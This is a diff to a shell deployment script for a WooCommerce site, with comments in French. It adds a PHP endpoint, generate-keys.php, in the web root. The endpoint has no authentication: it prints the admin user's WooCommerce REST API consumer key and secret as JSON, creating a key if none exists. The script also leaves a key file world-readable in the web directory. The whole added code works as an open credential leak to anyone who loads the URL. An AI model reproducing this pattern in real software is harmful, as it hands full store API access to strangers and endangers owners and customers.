@@ -298,6 +298,39 @@ cat > "$WP_DIR/wc-api-keys.json" <<KEYJSON
 }
 KEYJSON
 chmod 644 "$WP_DIR/wc-api-keys.json"
+
+# Créer un endpoint PHP pour générer les clés si le fichier est vide
+if [ ! -f "$WP_DIR/generate-keys.php" ]; then
+cat > "$WP_DIR/generate-keys.php" <<'PHPEOF'
+<?php
+// Génère des clés REST API WooCommerce pour l'admin
+header('Content-Type: application/json');
+$_SERVER['PHP_SELF'] = '/wp-admin/admin-ajax.php';
+require_once('/var/www/html/wp-load.php');
+require_once('/var/www/html/wp-admin/includes/user.php');
+
+// Trouver l'admin
+$user = get_user_by('login', 'admin');
+if (!$user) { echo json_encode(['error' => 'Admin not found']); exit; }
+
+// Vérifier si une clé existe déjà
+$existing = $wpdb->get_var("SELECT consumer_key FROM {$wpdb->prefix}woocommerce_api_keys WHERE user_id = {$user->ID} ORDER BY key_id DESC LIMIT 1");
+if ($existing) {
+    $secret = $wpdb->get_var("SELECT consumer_secret FROM {$wpdb->prefix}woocommerce_api_keys WHERE user_id = {$user->ID} ORDER BY key_id DESC LIMIT 1");
+    echo json_encode(['consumer_key' => $existing, 'consumer_secret' => $secret, 'store_url' => 'https://olmeick-woocommerce.onrender.com', 'source' => 'existing']);
+    exit;
+}
+
+// Générer une nouvelle clé
+$key_id = wc_generate_api_key(['user_id' => $user->ID, 'description' => 'OLMEICK Auto-Key']);
+if (is_wp_error($key_id)) { echo json_encode(['error' => $key_id->get_error_message()]); exit; }
+
+$key_data = $wpdb->get_row($wpdb->prepare("SELECT consumer_key, consumer_secret FROM {$wpdb->prefix}woocommerce_api_keys WHERE key_id = %d", $key_id));
+echo json_encode(['consumer_key' => $key_data->consumer_key, 'consumer_secret' => $key_data->consumer_secret, 'store_url' => 'https://olmeick-woocommerce.onrender.com', 'source' => 'generated']);
+PHPEOF
+chmod 644 "$WP_DIR/generate-keys.php"
+log "  → Endpoint /generate-keys.php créé"
+fi
 log "  → Clés sauvegardées dans /wc-api-keys.json"
 touch "$API_KEY_FLAG"
 
